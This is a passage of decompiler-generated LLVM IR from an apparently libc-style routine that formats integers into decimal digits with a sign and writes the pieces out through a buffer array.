  %v5_8051b4c = icmp slt i32 %v0_8051b49, -4
  br i1 %v5_8051b4c, label %dec_label_pc_8051b71, label %dec_label_pc_8051b4e

dec_label_pc_8051b4e:                             ; preds = %dec_label_pc_8051b49
  %v1_8051b4e = load i32, i32* %ebx.global-to-local, align 4
  %v7_8051b50 = icmp slt i32 %v1_8051b4e, %v0_8051b49
  br i1 %v7_8051b50, label %dec_label_pc_8051b71, label %dec_label_pc_8051b59

dec_label_pc_8051b59:                             ; preds = %dec_label_pc_8051b4e
  %v2_8051b60 = sub i32 %v1_8051b4e, %v0_8051b49
  store i32 %v2_8051b60, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051b75

dec_label_pc_8051b64:                             ; preds = %dec_label_pc_8051b37
  %v4_8051b64 = zext i8 %stack_var_-206.1 to i32
  %v5_8051b64 = load i32, i32* %ecx.global-to-local, align 4
  %v6_8051b64 = and i32 %v5_8051b64, -256
  %v7_8051b64 = or i32 %v6_8051b64, %v4_8051b64
  store i32 %v7_8051b64, i32* %ecx.global-to-local, align 4
  %v10_8051b6c = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v10_8051b6c, label %dec_label_pc_8051b64.dec_label_pc_8051b75_crit_edge, label %dec_label_pc_8051b71

dec_label_pc_8051b64.dec_label_pc_8051b75_crit_edge: ; preds = %dec_label_pc_8051b64
  %v0_8051b75.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051b75

dec_label_pc_8051b71:                             ; preds = %dec_label_pc_8051b49, %dec_label_pc_8051b4e, %dec_label_pc_8051b64
  %stack_var_-197.0 = phi i8 [ %stack_var_-206.1, %dec_label_pc_8051b64 ], [ 103, %dec_label_pc_8051b4e ], [ 103, %dec_label_pc_8051b49 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051b7f

dec_label_pc_8051b75:                             ; preds = %dec_label_pc_8051b64.dec_label_pc_8051b75_crit_edge, %dec_label_pc_8051b59
  %v0_8051b75 = phi i32 [ %v0_8051b75.pre, %dec_label_pc_8051b64.dec_label_pc_8051b75_crit_edge ], [ %v0_8051b49, %dec_label_pc_8051b59 ]
  store i32 %v0_8051b75, i32* %ebx.global-to-local, align 4
  %v2_8051b77 = icmp slt i32 %v0_8051b75, 0
  %v1_8051b79 = icmp eq i1 %v2_8051b77, false
  br i1 %v1_8051b79, label %dec_label_pc_8051b7f, label %dec_label_pc_8051b7b

dec_label_pc_8051b7b:                             ; preds = %dec_label_pc_8051b75
  %v0_8051b7b = load i32, i32* %edx.global-to-local, align 4
  %v1_8051b7b = add i32 %v0_8051b7b, -1
  store i32 %v1_8051b7b, i32* %edx.global-to-local, align 4
  %v1_8051b7c = inttoptr i32 %v1_8051b7b to i8*
  store i8 48, i8* %v1_8051b7c, align 1
  %v0_8051bb4.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051b7f

dec_label_pc_8051b7f:                             ; preds = %dec_label_pc_8051b75, %dec_label_pc_8051b71, %dec_label_pc_8051b7b
  %v1_8051c0f = phi i32 [ %v0_8051b75, %dec_label_pc_8051b75 ], [ %v0_8051bb4.pre, %dec_label_pc_8051b7b ], [ 0, %dec_label_pc_8051b71 ]
  %stack_var_-197.2 = phi i8 [ 102, %dec_label_pc_8051b75 ], [ 102, %dec_label_pc_8051b7b ], [ %stack_var_-197.0, %dec_label_pc_8051b71 ]
  %v2_8051b7f = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_8051b7f, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_8051b9a = load i32, i32* %edx.global-to-local, align 4
  %v1_8051b9a = inttoptr i32 %v0_8051b9a to i8*
  %v2_8051b9a = load i8, i8* %v1_8051b9a, align 1
  %v3_8051b9a = zext i8 %v2_8051b9a to i32
  %v5_8051b9a = and i32 %v2_8051b7f, -256
  %v6_8051b9a = or i32 %v3_8051b9a, %v5_8051b9a
  store i32 %v6_8051b9a, i32* %eax.global-to-local, align 4
  %v1_8051b9c = add i32 %v0_8051b9a, 1
  store i32 %v1_8051b9c, i32* %edi.global-to-local, align 4
  store i32 %v6_8051b9a, i32* %stack_var_-22, align 4
  %v2_8051baa = sub i32 %v1_8051b37, %v1_8051b9c
  store i32 %v2_8051baa, i32* %edx.global-to-local, align 4
  %v1_8051bb4 = icmp eq i32 %v1_8051c0f, 0
  %v2_8051bb4 = icmp slt i32 %v1_8051c0f, 0
  br i1 %v2_8051bb4, label %dec_label_pc_8051c03, label %dec_label_pc_8051bb8

dec_label_pc_8051bb8:                             ; preds = %dec_label_pc_8051b7f
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8051bc4 = sub i32 %v1_8051c0f, %v2_8051baa
  %v8_8051bc4 = xor i32 %v2_8051baa, %v1_8051c0f
  %v9_8051bc4 = xor i32 %v2_8051bc4, %v1_8051c0f
  %v10_8051bc4 = and i32 %v9_8051bc4, %v8_8051bc4
  %v11_8051bc4 = icmp slt i32 %v10_8051bc4, 0
  %v13_8051bc4 = icmp slt i32 %v2_8051bc4, 0
  %v2_8051bc6 = icmp eq i1 %v13_8051bc4, %v11_8051bc4
  br i1 %v2_8051bc6, label %dec_label_pc_8051bc8, label %dec_label_pc_8051bfc

dec_label_pc_8051bc8:                             ; preds = %dec_label_pc_8051bb8
  store i32 %v2_8051bc4, i32* %eax.global-to-local, align 4
  %tmp138 = icmp slt i32 %v2_8051bc4, 1
  %tmp139 = icmp eq i1 %tmp138, false
  br i1 %tmp139, label %dec_label_pc_8051bdd, label %dec_label_pc_8051bf8

dec_label_pc_8051bdd:                             ; preds = %dec_label_pc_8051bc8
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8051bf8

dec_label_pc_8051bf8:                             ; preds = %dec_label_pc_8051bc8, %dec_label_pc_8051bdd
  %storemerge10.in = phi i32* [ %stack_var_-120, %dec_label_pc_8051bdd ], [ %stack_var_-132, %dec_label_pc_8051bc8 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge10 = ptrtoint i32* %storemerge10.in to i32
  store i32 %storemerge10, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051c18

dec_label_pc_8051bfc:                             ; preds = %dec_label_pc_8051bb8
  %v4_8051bfe = icmp eq i1 %v1_8051bb4, false
  br i1 %v4_8051bfe, label %dec_label_pc_8051c09, label %dec_label_pc_8051c00

dec_label_pc_8051c00:                             ; preds = %dec_label_pc_8051bfc
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051c03

dec_label_pc_8051c03:                             ; preds = %dec_label_pc_8051b7f, %dec_label_pc_8051c00
  %v0_8051c4b73 = phi i32 [ %v1_8051c0f, %dec_label_pc_8051b7f ], [ -1, %dec_label_pc_8051c00 ]
  %v2_8051c03 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8051c03, i32* @ecx, align 4
  br label %dec_label_pc_8051c18

dec_label_pc_8051c09:                             ; preds = %dec_label_pc_8051bfc
  %v2_8051c0d = add i32 %v1_8051b9c, %v1_8051c0f
  store i32 %v2_8051c0d, i32* %edi.global-to-local, align 4
  %v2_8051c0f = sub i32 %v2_8051baa, %v1_8051c0f
  store i32 %v2_8051c0f, i32* %edx.global-to-local, align 4
  %v2_8051c11 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8051c11, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051c18

dec_label_pc_8051c18:                             ; preds = %dec_label_pc_8051c03, %dec_label_pc_8051bf8, %dec_label_pc_8051c09
  %v0_8051c4b72 = phi i32 [ %v0_8051c4b73, %dec_label_pc_8051c03 ], [ -1, %dec_label_pc_8051bf8 ], [ -1, %dec_label_pc_8051c09 ]
  %v0_8051c34 = phi i32 [ %v2_8051c03, %dec_label_pc_8051c03 ], [ %storemerge10, %dec_label_pc_8051bf8 ], [ %v2_8051c11, %dec_label_pc_8051c09 ]
  %v0_8051c25 = phi i32 [ %v2_8051baa, %dec_label_pc_8051c03 ], [ 0, %dec_label_pc_8051bf8 ], [ %v2_8051c0f, %dec_label_pc_8051c09 ]
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v2_8051c1f = inttoptr i32 %v1_8051877 to i8*
  %v3_8051c1f = load i8, i8* %v2_8051c1f, align 1
  %v4_8051c1f = and i8 %v3_8051c1f, 16
  %v5_8051c1f = icmp eq i8 %v4_8051c1f, 0
  %v1_8051c23 = icmp eq i1 %v5_8051c1f, false
  br i1 %v1_8051c23, label %dec_label_pc_8051c34, label %dec_label_pc_8051c25

dec_label_pc_8051c25:                             ; preds = %dec_label_pc_8051c18
  %v1_8051c25 = icmp eq i32 %v0_8051c25, 0
  %v1_8051c27 = icmp eq i1 %v1_8051c25, false
  br i1 %v1_8051c27, label %dec_label_pc_8051c34, label %dec_label_pc_8051c29

dec_label_pc_8051c29:                             ; preds = %dec_label_pc_8051c25
  br i1 %v12_8051a8d, label %dec_label_pc_8051c4b, label %dec_label_pc_8051c30

dec_label_pc_8051c30:                             ; preds = %dec_label_pc_8051c29
  %v0_8051c30 = load i32, i32* %ebp.global-to-local, align 4
  %tmp140 = icmp slt i32 %v0_8051c30, 1
  br i1 %tmp140, label %dec_label_pc_8051c4b, label %dec_label_pc_8051c34

dec_label_pc_8051c34:                             ; preds = %dec_label_pc_8051c30, %dec_label_pc_8051c25, %dec_label_pc_8051c18
  %v1_8051c34 = inttoptr i32 %v0_8051c34 to i32*
  store i32 112, i32* %v1_8051c34, align 4
  %v0_8051c3a = load i32, i32* @ecx, align 4
  %v1_8051c3a = add i32 %v0_8051c3a, 4
  %v2_8051c3a = inttoptr i32 %v1_8051c3a to i32*
  store i32 1, i32* %v2_8051c3a, align 4
  %v0_8051c41 = load i32, i32* @ecx, align 4
  %v1_8051c41 = add i32 %v0_8051c41, 8
  %v2_8051c41 = inttoptr i32 %v1_8051c41 to i32*
  store i32 ptrtoint (i32* @global_var_805404c.171 to i32), i32* %v2_8051c41, align 4
  %v0_8051c48 = load i32, i32* @ecx, align 4
  %v1_8051c48 = add i32 %v0_8051c48, 12
  store i32 %v1_8051c48, i32* @ecx, align 4
  %v0_8051c4b.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051c4b

dec_label_pc_8051c4b:                             ; preds = %dec_label_pc_8051c30, %dec_label_pc_8051c29, %dec_label_pc_8051c34
  %v0_8051c50 = phi i32 [ %v0_8051c34, %dec_label_pc_8051c30 ], [ %v0_8051c34, %dec_label_pc_8051c29 ], [ %v1_8051c48, %dec_label_pc_8051c34 ]
  %v0_8051c4b = phi i32 [ %v0_8051c4b72, %dec_label_pc_8051c30 ], [ %v0_8051c4b72, %dec_label_pc_8051c29 ], [ %v0_8051c4b.pre, %dec_label_pc_8051c34 ]
  %v1_8051c4b = add i32 %v0_8051c4b, 1
  %v8_8051c4b = icmp eq i32 %v1_8051c4b, 0
  store i32 %v1_8051c4b, i32* %ebx.global-to-local, align 4
  br i1 %v8_8051c4b, label %dec_label_pc_8051c65, label %dec_label_pc_8051c4e

dec_label_pc_8051c4e:                             ; preds = %dec_label_pc_8051c4b
  store i32 %v1_8051c4b, i32* %eax.global-to-local, align 4
  %v1_8051c50 = inttoptr i32 %v0_8051c50 to i32*
  store i32 176, i32* %v1_8051c50, align 4
  %v0_8051c56 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051c56 = sub i32 0, %v0_8051c56
  store i32 %v1_8051c56, i32* %eax.global-to-local, align 4
  %v1_8051c58 = load i32, i32* @ecx, align 4
  %v2_8051c58 = add i32 %v1_8051c58, 4
  %v3_8051c58 = inttoptr i32 %v2_8051c58 to i32*
  store i32 %v1_8051c56, i32* %v3_8051c58, align 4
  %v0_8051c5b = load i32, i32* @ecx, align 4
  %v1_8051c5b = add i32 %v0_8051c5b, 8
  %v2_8051c5b = inttoptr i32 %v1_8051c5b to i32*
  store i32 ptrtoint (i32* @global_var_805403f.170 to i32), i32* %v2_8051c5b, align 4
  %v0_8051c62 = load i32, i32* @ecx, align 4
  %v1_8051c62 = add i32 %v0_8051c62, 12
  store i32 %v1_8051c62, i32* @ecx, align 4
  br label %dec_label_pc_8051c65

dec_label_pc_8051c65:                             ; preds = %dec_label_pc_8051c4b, %dec_label_pc_8051c4e
  %v0_8051c69 = phi i32 [ %v0_8051c50, %dec_label_pc_8051c4b ], [ %v1_8051c62, %dec_label_pc_8051c4e ]
  %v0_8051c65 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051c65 = icmp eq i32 %v0_8051c65, 0
  br i1 %v1_8051c65, label %dec_label_pc_8051c78, label %dec_label_pc_8051c69

dec_label_pc_8051c69:                             ; preds = %dec_label_pc_8051c65
  %v1_8051c69 = inttoptr i32 %v0_8051c69 to i32*
  store i32 112, i32* %v1_8051c69, align 4
  %v0_8051c6f = load i32, i32* %edx.global-to-local, align 4
  %v1_8051c6f = load i32, i32* @ecx, align 4
  %v2_8051c6f = add i32 %v1_8051c6f, 4
  %v3_8051c6f = inttoptr i32 %v2_8051c6f to i32*
  store i32 %v0_8051c6f, i32* %v3_8051c6f, align 4
  %v0_8051c72 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051c72 = load i32, i32* @ecx, align 4
  %v2_8051c72 = add i32 %v1_8051c72, 8
  %v3_8051c72 = inttoptr i32 %v2_8051c72 to i32*
  store i32 %v0_8051c72, i32* %v3_8051c72, align 4
  %v0_8051c75 = load i32, i32* @ecx, align 4
  %v1_8051c75 = add i32 %v0_8051c75, 12
  store i32 %v1_8051c75, i32* @ecx, align 4
  br label %dec_label_pc_8051c78

dec_label_pc_8051c78:                             ; preds = %dec_label_pc_8051c65, %dec_label_pc_8051c69
  %v0_8051c96 = phi i32 [ %v0_8051c69, %dec_label_pc_8051c65 ], [ %v1_8051c75, %dec_label_pc_8051c69 ]
  br i1 %v1_8051a92, label %dec_label_pc_8051c8c, label %dec_label_pc_8051c7f

dec_label_pc_8051c7f:                             ; preds = %dec_label_pc_8051c78
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v3_8051c86 = load i8, i8* %v2_8051c1f, align 1
  %v4_8051c86 = and i8 %v3_8051c86, 16
  %v5_8051c86 = icmp eq i8 %v4_8051c86, 0
  br i1 %v5_8051c86, label %dec_label_pc_8051ca9, label %dec_label_pc_8051c8c

dec_label_pc_8051c8c:                             ; preds = %dec_label_pc_8051c7f, %dec_label_pc_8051c78
  %v0_8051c8c = load i32, i32* %edx.global-to-local, align 4
  %v1_8051c8e = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051c8e = sub i32 %v0_8051c8c, %v1_8051c8e
  store i32 %v2_8051c8e, i32* %eax.global-to-local, align 4
  %v1_8051c90 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051c90 = sub i32 %v2_8051c8e, %v1_8051c90
  %v8_8051c90 = xor i32 %v1_8051c90, %v2_8051c8e
  %v9_8051c90 = xor i32 %v2_8051c90, %v2_8051c8e
  %v10_8051c90 = and i32 %v9_8051c90, %v8_8051c90
  %v11_8051c90 = icmp slt i32 %v10_8051c90, 0
  %v13_8051c90 = icmp slt i32 %v2_8051c90, 0
  %v2_8051c92 = icmp eq i1 %v13_8051c90, %v11_8051c90
  br i1 %v2_8051c92, label %dec_label_pc_8051ca9, label %dec_label_pc_8051c94

dec_label_pc_8051c94:                             ; preds = %dec_label_pc_8051c8c
  %v2_8051c94 = sub i32 %v1_8051c90, %v2_8051c8e
  store i32 %v2_8051c94, i32* %ebp.global-to-local, align 4
  %v1_8051c96 = inttoptr i32 %v0_8051c96 to i32*
  store i32 176, i32* %v1_8051c96, align 4
  %v0_8051c9c = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051c9c = load i32, i32* @ecx, align 4
  %v2_8051c9c = add i32 %v1_8051c9c, 4
  %v3_8051c9c = inttoptr i32 %v2_8051c9c to i32*
  store i32 %v0_8051c9c, i32* %v3_8051c9c, align 4
  %v0_8051c9f = load i32, i32* @ecx, align 4
  %v1_8051c9f = add i32 %v0_8051c9f, 8
  %v2_8051c9f = inttoptr i32 %v1_8051c9f to i32*
  store i32 ptrtoint (i32* @global_var_805403f.170 to i32), i32* %v2_8051c9f, align 4
  %v0_8051ca6 = load i32, i32* @ecx, align 4
  %v1_8051ca6 = add i32 %v0_8051ca6, 12
  store i32 %v1_8051ca6, i32* @ecx, align 4
  br label %dec_label_pc_8051ca9

dec_label_pc_8051ca9:                             ; preds = %dec_label_pc_8051c8c, %dec_label_pc_8051c7f, %dec_label_pc_8051c94
  %v1_8051d2c84 = phi i32 [ %v0_8051c96, %dec_label_pc_8051c8c ], [ %v0_8051c96, %dec_label_pc_8051c7f ], [ %v1_8051ca6, %dec_label_pc_8051c94 ]
  %v12_8051ca9 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_8051ca9, label %dec_label_pc_8051d1f, label %dec_label_pc_8051cb0

dec_label_pc_8051cb0:                             ; preds = %dec_label_pc_8051ca9
  %v0_8051cb7 = load i32, i32* %esi.global-to-local, align 4
  %v2_8051cb7 = icmp slt i32 %v0_8051cb7, 0
  %v1_8051cb9 = trunc i32 %stack_var_-42.0 to i8
  store i32 %v0_8051cb7, i32* %edx.global-to-local, align 4
  br i1 %v2_8051cb7, label %dec_label_pc_8051cc8, label %dec_label_pc_8051cbf

dec_label_pc_8051cbf:                             ; preds = %dec_label_pc_8051cb0
  store i32 43, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051cd1

dec_label_pc_8051cc8:                             ; preds = %dec_label_pc_8051cb0
  store i32 45, i32* %edi.global-to-local, align 4
  %v1_8051ccf = sub i32 0, %v0_8051cb7
  store i32 %v1_8051ccf, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051cd1

dec_label_pc_8051cd1:                             ; preds = %dec_label_pc_8051cbf, %dec_label_pc_8051cc8
  %v0_8051ce577 = phi i32 [ %v0_8051cb7, %dec_label_pc_8051cbf ], [ %v1_8051ccf, %dec_label_pc_8051cc8 ]
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8051cd9 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8051cd9, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051ce5

dec_label_pc_8051ce5:                             ; preds = %dec_label_pc_8051ce5.backedge, %dec_label_pc_8051cd1
  %v0_8051cf3 = phi i32 [ %v0_8051cf6, %dec_label_pc_8051ce5.backedge ], [ 2, %dec_label_pc_8051cd1 ]
  %v0_8051cef = phi i32 [ %v0_8051cef.pre, %dec_label_pc_8051ce5.backedge ], [ %v2_8051cd9, %dec_label_pc_8051cd1 ]
  %v0_8051ce5 = phi i32 [ %v9_8051ced, %dec_label_pc_8051ce5.backedge ], [ %v0_8051ce577, %dec_label_pc_8051cd1 ]
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_8051cec = ashr i32 %v0_8051ce5, 31
  %v2_8051ced = zext i32 %v0_8051ce5 to i64
  %v4_8051ced = zext i32 %v1_8051cec to i64
  %v5_8051ced = mul nuw i64 %v4_8051ced, 4294967296
  %v6_8051ced = or i64 %v5_8051ced, %v2_8051ced
  %v8_8051ced = sdiv i64 %v6_8051ced, 10
  %v9_8051ced = trunc i64 %v8_8051ced to i32
  store i32 %v9_8051ced, i32* %eax.global-to-local, align 4
  %v11_8051ced = srem i64 %v6_8051ced, 10
  %v12_8051ced = trunc i64 %v11_8051ced to i8
  %v1_8051cef = add i32 %v0_8051cef, -1
  store i32 %v1_8051cef, i32* %ebx.global-to-local, align 4
  %v1_8051cf0 = add i8 %v12_8051ced, 48
  %v1_8051cf3 = add i32 %v0_8051cf3, 1
  store i32 %v1_8051cf3, i32* %esi.global-to-local, align 4
  %v3_8051cf4 = inttoptr i32 %v1_8051cef to i8*
  store i8 %v1_8051cf0, i8* %v3_8051cf4, align 1
  %v0_8051cf6 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v9_8051ced, i32* %edx.global-to-local, align 4
  %v7_8051cfb = icmp sgt i32 %v0_8051cf6, 3
  br i1 %v7_8051cfb, label %dec_label_pc_8051cfd, label %dec_label_pc_8051ce5.backedge

dec_label_pc_8051cfd:                             ; preds = %dec_label_pc_8051ce5
  %v2_8051cfd = icmp eq i32 %v9_8051ced, 0
  %v1_8051cff = icmp eq i1 %v2_8051cfd, false
  br i1 %v1_8051cff, label %dec_label_pc_8051ce5.backedge, label %dec_label_pc_8051d01

dec_label_pc_8051ce5.backedge:                    ; preds = %dec_label_pc_8051cfd, %dec_label_pc_8051ce5
  %v0_8051cef.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051ce5

dec_label_pc_8051d01:                             ; preds = %dec_label_pc_8051cfd
  %v0_8051d01 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8051d01, i32* %edx.global-to-local, align 4
  %v0_8051d03 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051d03 = add i32 %v0_8051d03, -2
  store i32 %v1_8051d03, i32* %eax.global-to-local, align 4
  %v1_8051d06 = trunc i32 %v0_8051d01 to i8
  %v3_8051d06 = add i32 %v0_8051d03, -1
  %v4_8051d06 = inttoptr i32 %v3_8051d06 to i8*
  store i8 %v1_8051d06, i8* %v4_8051d06, align 1
  %v5_8051d09 = load i32, i32* %edx.global-to-local, align 4
  %v6_8051d09 = and i32 %v5_8051d09, -256
  %v7_8051d09 = or i32 %v6_8051d09, %stack_var_-42.0
  store i32 %v7_8051d09, i32* %edx.global-to-local, align 4
  %v2_8051d0d = load i32, i32* %ebx.global-to-local, align 4
  %v3_8051d0d = add i32 %v2_8051d0d, -2
  %v4_8051d0d = inttoptr i32 %v3_8051d0d to i8*
  store i8 %v1_8051cb9, i8* %v4_8051d0d, align 1
  %v0_8051d10 = load i32, i32* @ecx, align 4
  %v1_8051d10 = inttoptr i32 %v0_8051d10 to i32*
  store i32 112, i32* %v1_8051d10, align 4
  %v0_8051d16 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051d16 = load i32, i32* @ecx, align 4
  %v2_8051d16 = add i32 %v1_8051d16, 4
  %v3_8051d16 = inttoptr i32 %v2_8051d16 to i32*
  store i32 %v0_8051d16, i32* %v3_8051d16, align 4
  %v0_8051d19 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051d19 = load i32, i32* @ecx, align 4
  %v2_8051d19 = add i32 %v1_8051d19, 8
  %v3_8051d19 = inttoptr i32 %v2_8051d19 to i32*
  store i32 %v0_8051d19, i32* %v3_8051d19, align 4
  %v0_8051d1c = load i32, i32* @ecx, align 4
  %v1_8051d1c = add i32 %v0_8051d1c, 12
  store i32 %v1_8051d1c, i32* @ecx, align 4
  br label %dec_label_pc_8051d1f

dec_label_pc_8051d1f:                             ; preds = %dec_label_pc_8051ca9, %dec_label_pc_8051944, %dec_label_pc_8051d01
  %v0_8051da0 = phi i32 [ %v1_8051d2c84, %dec_label_pc_8051ca9 ], [ %v2_805194c, %dec_label_pc_8051944 ], [ %v1_8051d1c, %dec_label_pc_8051d01 ]
  %v2_8051d1f = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8051d1f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051d23

dec_label_pc_8051d23:                             ; preds = %dec_label_pc_8051d23, %dec_label_pc_8051d1f
  %v0_8051d23 = phi i32 [ %v2_8051d1f, %dec_label_pc_8051d1f ], [ %v1_8051d25, %dec_label_pc_8051d23 ]
  %stack_var_-216.0 = phi i32 [ %v3_8051837, %dec_label_pc_8051d1f ], [ %v5_8051d28, %dec_label_pc_8051d23 ]
  %v1_8051d23 = inttoptr i32 %v0_8051d23 to i32*
  %v2_8051d23 = load i32, i32* %v1_8051d23, align 4
  store i32 %v2_8051d23, i32* %edx.global-to-local, align 4
  %v1_8051d25 = add i32 %v0_8051d23, 12
  store i32 %v1_8051d25, i32* %eax.global-to-local, align 4
  %v5_8051d28 = sub i32 %stack_var_-216.0, %v2_8051d23
  %v7_8051d2c = icmp ult i32 %v1_8051d25, %v0_8051da0
  br i1 %v7_8051d2c, label %dec_label_pc_8051d23, label %dec_label_pc_8051d30

dec_label_pc_8051d30:                             ; preds = %dec_label_pc_8051d23
  %v5_8051d39 = icmp eq i8 %stack_var_-26.0, 0
  %v1_8051d49 = icmp eq i1 %v5_8051d39, false
  %v2_8051d49 = zext i1 %v1_8051d49 to i32
  %v2_8051d4c = sub i32 %v5_8051d28, %v2_8051d49
  store i32 %v2_8051d4c, i32* %edx.global-to-local, align 4
  store i32 160, i32* %stack_var_-168, align 4
  store i32 %v2_8051d4c, i32* %eax.global-to-local, align 4
  store i32 %v0_8051da0, i32* %esi.global-to-local, align 4
  %tmp141 = icmp slt i32 %v2_8051d4c, 1
  br i1 %tmp141, label %dec_label_pc_8051da2, label %dec_label_pc_8051d62

dec_label_pc_8051d62:                             ; preds = %dec_label_pc_8051d30
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v2_8051d69 = inttoptr i32 %v1_8051877 to i8*
  %v3_8051d69 = load i8, i8* %v2_8051d69, align 1
  %v4_8051d69 = and i8 %v3_8051d69, 8
  %v5_8051d69 = icmp eq i8 %v4_8051d69, 0
  br i1 %v5_8051d69, label %dec_label_pc_8051d84, label %dec_label_pc_8051d6f

dec_label_pc_8051d6f:                             ; preds = %dec_label_pc_8051d62
  %v1_8051d6f = add i32 %v0_8051da0, 12
  store i32 %v1_8051d6f, i32* %esi.global-to-local, align 4
  %v1_8051d72 = inttoptr i32 %v0_8051da0 to i32*
  store i32 160, i32* %v1_8051d72, align 4
  %v0_8051d78 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051d78 = load i32, i32* @ecx, align 4
  %v2_8051d78 = add i32 %v1_8051d78, 4
  %v3_8051d78 = inttoptr i32 %v2_8051d78 to i32*
  store i32 %v0_8051d78, i32* %v3_8051d78, align 4
  %v0_8051d7b = load i32, i32* @ecx, align 4
  %v1_8051d7b = add i32 %v0_8051d7b, 8
  %v2_8051d7b = inttoptr i32 %v1_8051d7b to i32*
  store i32 ptrtoint (i32* @global_var_805403f.170 to i32), i32* %v2_8051d7b, align 4
  br label %dec_label_pc_8051da2

dec_label_pc_8051d84:                             ; preds = %dec_label_pc_8051d62
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_8051d8b = add i32 %tmp112, 16
  %v2_8051d8b = inttoptr i32 %v1_8051d8b to i32*
  %v3_8051d8b = load i32, i32* %v2_8051d8b, align 4
  %v9_8051d8b = icmp eq i32 %v3_8051d8b, 48
  %v1_8051d8f = icmp eq i1 %v9_8051d8b, false
  br i1 %v1_8051d8f, label %dec_label_pc_8051d9c, label %dec_label_pc_8051d91

dec_label_pc_8051d91:                             ; preds = %dec_label_pc_8051d84
  %v3_8051d91 = load i32, i32* %stack_var_-152, align 4
  %v5_8051d91 = add i32 %v3_8051d91, %v2_8051d4c
  store i32 %v5_8051d91, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8051da0

dec_label_pc_8051d97:                             ; preds = %dec_label_pc_8051da8
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051dcf

dec_label_pc_8051d9c:                             ; preds = %dec_label_pc_8051d84
  br label %dec_label_pc_8051da0

dec_label_pc_8051da0:                             ; preds = %dec_label_pc_8051d91, %dec_label_pc_8051d9c
  store i32 %v0_8051da0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051da2

dec_label_pc_8051da2:                             ; preds = %dec_label_pc_8051d30, %dec_label_pc_8051d6f, %dec_label_pc_8051da0
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8051da4 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8051da4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051da8

dec_label_pc_8051da8:                             ; preds = %dec_label_pc_8051dc6, %dec_label_pc_8051da2
  call void @__pseudo_call(i32 %tmp112)
  %v0_8051dc1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051dc1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051dc1 = add i32 %v1_8051dc1, 4
  %v3_8051dc1 = inttoptr i32 %v2_8051dc1 to i32*
  %v4_8051dc1 = load i32, i32* %v3_8051dc1, align 4
  %v15_8051dc1 = icmp eq i32 %v0_8051dc1, %v4_8051dc1
  %v1_8051dc4 = icmp eq i1 %v15_8051dc1, false
  br i1 %v1_8051dc4, label %dec_label_pc_8051d97, label %dec_label_pc_8051dc6

dec_label_pc_8051dc6:                             ; preds = %dec_label_pc_8051da8
  %v1_8051dc6 = add i32 %v1_8051dc1, 12
  store i32 %v1_8051dc6, i32* %ebx.global-to-local, align 4
  %v0_8051dc9 = load i32, i32* %edi.global-to-local, align 4
  %v2_8051dc9 = add i32 %v0_8051dc9, %v0_8051dc1
  store i32 %v2_8051dc9, i32* %edi.global-to-local, align 4
  %v1_8051dcb = load i32, i32* %esi.global-to-local, align 4
  %v7_8051dcb = icmp ult i32 %v1_8051dc6, %v1_8051dcb
  br i1 %v7_8051dcb, label %dec_label_pc_8051da8, label %dec_label_pc_8051dcf

dec_label_pc_8051dcf:                             ; preds = %dec_label_pc_8051dc6, %dec_label_pc_8051d97
  %v0_8051dd5 = phi i32 [ -1, %dec_label_pc_8051d97 ], [ %v2_8051dc9, %dec_label_pc_8051dc6 ]
  store i32 %v0_8051dd5, i32* %eax.global-to-local, align 4
  %v2_8051dd8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051dd8, i32* @esi, align 4
  store i32 %v0_805181a, i32* @edi, align 4
  store i32 %v0_8051819, i32* @ebp, align 4
  ret i32 %v0_8051dd5

; uselistorder directives
